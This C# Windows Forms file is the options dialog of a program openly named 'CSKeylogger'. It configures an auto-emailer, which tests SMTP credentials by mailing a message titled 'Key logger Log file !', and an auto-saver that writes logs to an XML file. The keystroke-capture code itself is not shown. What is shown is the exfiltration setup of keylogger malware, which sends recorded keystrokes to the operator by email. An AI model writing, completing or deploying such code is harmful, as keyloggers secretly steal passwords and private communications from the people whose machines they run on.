using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.Net;
using System.Net.Mail;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace KeyLogger
{
    public partial class Frmoptions : Form
    {
        public Frmoptions()
        {
            InitializeComponent();
        }

        private void ChkAutosaverCheckedChanged(object sender, EventArgs e)
        {
            pnl_saver.Enabled = chk_autosaver.Checked;
        }

        private void ChkAutoemailerCheckedChanged(object sender, EventArgs e)
        {
            pnl_emailer.Enabled = chk_autoemailer.Checked;
        }

        private void BtnOkClick(object sender, EventArgs e)
        {
            if (chk_autoemailer.Checked)
            {
                //check email address credentials!

                MessageBox.Show("We will send an email to your address, this will take a moment, please be patient!", "Testing credentials ...");

                try
                {
                    var mailaddress = txt_emailAddress.Text;
                    var smtpHost = txt_smtpServer.Text;
                    var smtpPort = Convert.ToInt32(txt_smtpport.Text);
                    var mailpassword = txt_emailpassword.Text;
                    const string body = "this is a test !\n if you receiving this email because we are testing credentials on your account!";

                    var fromAddress = new MailAddress(mailaddress, "CSKeylogger");
                    var toAddress = new MailAddress(mailaddress, "CSKeylogger");
                    const string subject = "Key logger Log file !";
                    var smtp = new SmtpClient
                    {
                        Host = smtpHost,
                        Port = smtpPort,
                        EnableSsl = chk_usessl.Checked,
                        DeliveryMethod = SmtpDeliveryMethod.Network,
                        UseDefaultCredentials = false,
                        Credentials = new NetworkCredential(fromAddress.Address, mailpassword)
                    };
                    using (var message = new MailMessage(fromAddress, toAddress)
                    {
                        Subject = subject,
                        Body = body
                    })
                    {
                        smtp.Send(message);

                    }
                }
                catch (Exception ex)
                {
                    Trace.WriteLine("Exception {0}, Error Occurred!", ex.Message);
                    MessageBox.Show(string.Format("Sending Email Failed! \n {0}", ex.Message), "Error!");
                    return;
                }

            }
            if (chk_autosaver.Checked)
            {
                //check file access and permission
            }
            
            DialogResult = DialogResult.OK;
            Close();
        }

        private void BtnCancelClick(object sender, EventArgs e)
        {
            DialogResult = DialogResult.Cancel;
            Close();
        }

        private void BtnBrwoseClick(object sender, EventArgs e)
        {
            var savef = new SaveFileDialog() {Title = "Save ...", Filter = "CSKeylogger log files (*.xml)|*.xml", FileName = "Logfile.xml"};
            if ( savef.ShowDialog() == DialogResult.OK)
            {
                txt_filelocation.Text = savef.FileName;
            }
        }

    }
}
